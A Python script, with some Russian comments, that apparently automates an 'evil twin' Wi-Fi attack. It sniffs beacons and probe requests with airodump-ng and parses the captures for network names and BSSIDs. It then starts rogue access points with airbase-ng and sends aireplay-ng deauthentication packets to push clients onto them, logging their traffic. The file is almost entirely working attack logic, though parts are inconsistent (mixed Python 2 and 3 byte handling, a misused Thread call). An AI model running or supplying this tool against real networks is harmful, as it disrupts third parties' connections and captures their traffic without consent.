import subprocess
from time import sleep
import threading
from binascii import unhexlify, hexlify
import argparse
import os

cache = []

dump_num = 2

class Logger:

    def __init__(self, log=None, err=None):
        '''
        log - информация
        errors - ошибки
        '''
        self.log, self.err =\
            Logger.checkParams(log, err)
        self.clean()

    @staticmethod
    def checkParams(log, err):
        if not (log and err):
            import platform
            if str(platform.system()) == 'Linux':
                log = log if log else '/tmp/log.txt'
                err = err if err else '/tmp/err.txt'
            elif str(platform.system()) == 'Windows':
                # TODO: find out which Win dirs are available to be written in
                log = log if log else '/tmp/log.txt'
                err = err if err else '/tmp/err.txt'
        return log, err

    def clean(self):
        '''
        очищаем файлы перед созданием новой сущности
        '''
        for _i in self.__dict__:
            with open(self.__dict__[_i], 'w', encoding='utf-8') as fw:
                fw.write('')

    def addLineToLog(self, line):
        '''
        (метод не обязательный, для отладки)
        регистрация события
        line - словарь с событием
        '''
        with open(self.log, 'a', encoding='utf-8') as fw:
            import datetime
            message = '--\n' + str(datetime.datetime.now()) + '\n'\
                    '\t1.Processing\n' +\
                    '\t\t' + line['function'] + '\n'\
                    '\t2.Output\n' +\
                    '\t\t' + line['output'] + '\n'
            fw.write(message)

    def addLineToErr(self, line):
        '''
        (метод не обязательный, для отладки)
        регистрация события
        line - словарь с событием
        '''
        with open(self.err, 'a', encoding='utf-8') as fw:
            import datetime
            message = '--\n' + str(datetime.datetime.now()) + '\n'\
                    '\t1.Processing\n' +\
                    '\t\t' + line['function'] + '\n'\
                    '\t2.Output\n' +\
                    '\t\t' + line['output'] + '\n'
            fw.write(message)

    def addToLine(self, function, output, level):
        '''
        (метод не обязательный, для отладки)
        создание события для вывода в лог
        function - где произошло
        output - что именно печатаем
        level - 'error' or 'log', logging level
        '''
        d = dict()
        d['function'] = function
        d['output'] = output
        if level == 'error':
            self.addLineToErr(d)
        elif level == 'log':
            self.addLineToLog(d)


def start_AP(essid, bssid, netw_iface, path, channel):
    '''
    start new access point with certain parameters
    input:
        essid - essid of access point
        bssid - bssid of access point
        netw_iface - network interface name
        path - current dir
        channel - AP channel
    output:
        no
    '''
    try:
        import subprocess
        output = subprocess.run(["airmon-ng", "start", netw_iface, channel], capture_output=True)
        iwfaces = output.stdout.decode('utf-8')
        new_iface = get_mon_iface_name(iwfaces)
        
        kill = lambda process: process.terminate()
        import os
        os.chdir(path + "/logs/")
        if bssid == b"\xff\xff\xff\xff\xff\xff":
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", new_iface])
        else:
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", new_iface])
        timer = threading.Timer(3, kill, [cmd])
        try:
            timer.start()
            if (bssid) != b"\xff\xff\xff\xff\xff\xff":
                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", new_iface])
            stdout, stderr = cmd.communicate()
        finally:
            timer.cancel()
            subprocess.check_call(["airmon-ng", "stop", new_iface, channel])
            #subprocess.call(["python", path + "/converter_p.2.7.py", essid + "_log-01.cap", "hccap"])

    except Exception as e:
       print (e)


def lookup_dump(pcap_dump, netw_iface, path, logger):
    '''
    lookup pcap dump and collect AP's and client's beacon packets
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    packet_index = -1
    error_index = 0
    flag = False
    logger.addToLine('lookup_dump', pcap_dump + " file is being investigated", 'log')
    try:
        while True:
            try:
                f = open(path + "/sniffed/" + pcap_dump, 'rb')
                from pcapParser import load_savefile
                caps, header = load_savefile(f)
                packets = caps.packets
                # ------------------------------
                from time import time
                start = time()*1000
                # ------------------------------
                while time()*1000 - start <= 10:
                    packet_index += 1
                    #print str(packet_index) + "     " + str(time()*1000 - start) + "start " + str(start)
                    if flag == True and unhexlify(packets[packet_index][1].packet)[0] == b'\x80':    # if the packet is really a beacon
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[37].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
                                print ("in "  + str(packet_index + 1) + " ESSID " + current_essid + " found")
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                bssid = unhexlify((packets[packet_index][1].packet))[16: 22]
                                rates_len = int(unhexlify(packets[packet_index][1].packet)[38 + essid_len + 1].encode("hex"), 16)
                                channel = int(unhexlify((packets[packet_index][1].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
                                #print "\nBSSID: " + str(bssid) + " " + hexlify(bssid) + " of length " + str(len(bssid)) + "\n"
                                task_AP = Thread(start_AP(current_essid, bssid, netw_iface, path, str(channel)))
                                task_AP.start()
                        # ---------
                    
                    elif flag == False and unhexlify(packets[packet_index][1].packet)[0] == b'\x40':  # or if the packet is really a probe request
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[25].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff':  # if we've already seen this ESSID before
                                print ("in "  + str(packet_index + 1) + " ESSID " + current_essid + " found")
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1)))
                                task_AP.start()
                        # ---------
                    

                # ------------------------------
                f.close()

            except IOError:
                logger.addToLine('lookup_dump', pcap_dump + " file is not ready yet...", 'log')
                sleep(2)
                # --------
                if error_index == 5:
                    logger.addToLine('lookup_dump', "Waited too long, trying to scan the next file", 'err')
                    print ("\nWaited too long, trying to scan the next file\n")
                    return 0
                # --------
                error_index += 1

            except IndexError:
                if flag == True:
                    logger.addToLine('lookup_dump', 'Scan is done', 'log')
                    break
                else:
                    flag = True
                    packet_index = -1

            except Exception as e:
                t = 10

    except KeyboardInterrupt:
        exit(1)


def start_sender(netw_iface, path, logger):
    '''
    lookup for pcap dump files in /logs folder
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    import os
    os.chdir(path + "/logs/")
    # -------------------------------------
    i = 1
    while i <= dump_num:
        if i <= 9:
            dump = "beac_dump-0" + str(i) + ".cap"
        else:
            dump = "beac_dump-" + str(i) + ".cap"

        lookup_dump(dump, netw_iface, path, logger)
        i += 1


def timeout(p):
    p.kill()


def start_sniffer(netw_iface, path, logger):
    '''
    monitor broadcast and save anything to pcap dump files in /logs folder
    input:
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    from random import randint
    output = subprocess.run(["airmon-ng", "start", netw_iface, str(randint(1, 14))], capture_output=True)
    iwfaces = output.stdout.decode('utf-8')
    new_iface = get_mon_iface_name(iwfaces)
    logger.addToLine('start_sniffer', "new interface " + new_iface, 'log')
    # --
    import os
    os.chdir(path + "/sniffed/")
    i = 0
    try:
        while i < dump_num:
            os.chdir(path + "/sniffed/")
            kill = lambda process: process.terminate()
            cmd = subprocess.Popen(["airodump-ng", new_iface, "--beacons", "--write", "beac_dump"])
            timer = threading.Timer(5, kill, [cmd])
            try:
                timer.start()
                stdout, stderr = cmd.communicate()
            finally:
                timer.cancel()
            i += 1
        subprocess.run(["airmon-ng", "stop", new_iface], capture_output=False)
        logger.addToLine('start_sniffer', "sniffing has been finished", 'log')

    except Exception as e:
        logger.addToLine('start_sniffer', str(e), 'error')


def create_parser():
    '''
    create parser identity to parse cmd args
    input:
        no
    output:
        parser identity
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument ('-s', '--send', type=str, default = '', help='name of the interface that is to be used for listening')
    parser.add_argument ('-l', '--listen', type=str, default = '', help = 'name of the interface that is to be used for creating AP and sending deauth packets')

    return parser


def create_folders():
    '''
    create folders
        current_timendate/
                        logs/ - false AP interaction dumps
                        dumps/ - simple air sniffing dunps
    input:
        no
    output:
        $PWD/current_timendate
    '''
    import datetime
    pwd = os.getcwd()
    _new = str(datetime.datetime.now())
    subprocess.call(["mkdir", _new])
    subprocess.call(["mkdir", _new + "/sniffed"])
    subprocess.call(["mkdir", _new + "/logs"])
    return pwd + "/" + _new


def get_available_wifaces():
    wifaces = subprocess.run(["iwconfig"], capture_output=True)
    print(wifaces.stdout)
    with open("iwfaces.txt", "w") as fw:
        fw.write(wifaces.stdout.decode('utf-8'))


def get_mon_iface_name(iwfaces):
    from re import findall
    try:
        new_iface = findall(r'monitor\smode\s.+enabled\son\s.+', iwfaces)[0]
        new_iface = findall(r'[a-z0-9]+$', new_iface)[0]
        return new_iface

    except Exception as e:
        print(str(e))
        print("no new monitor interface found")
        return ''


if __name__ == "__main__":
    import sys
    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])
    logger = Logger()
 
    if not (namespace.send and namespace.listen):
        logger.addToLine('__main__', 'invalid input params\n', 'error')
        exit(1)

    try:
        # delete recent dump files
        logger.addToLine('__main__', os.getcwd()+'/del_recent_dumps.sh', 'log')
        exit_code = subprocess.call(os.getcwd() + '/del_recent_dumps.sh')
        # --
        # create dump folders and enter
        cwd = create_folders()
        os.chdir(cwd)
        while True:
            task1 = threading.Thread(target = start_sniffer, args=(namespace.listen, cwd, logger))
            task2 = threading.Thread(target = start_sender, args=(namespace.send, cwd, logger))
            task1.start()
            sleep(5)
            # task2.start()
            logger.addToLine('__main__', 'task1.is_alive: ' + str(task1.is_alive()), 'log')
            logger.addToLine('__main__', 'task2.is_alive: ' + str(task2.is_alive()), 'log')
            if not (task1.is_alive() and task2.is_alive()):
                break

    except Exception as e:
        logger.addToLine('__main__', str(e), 'error')

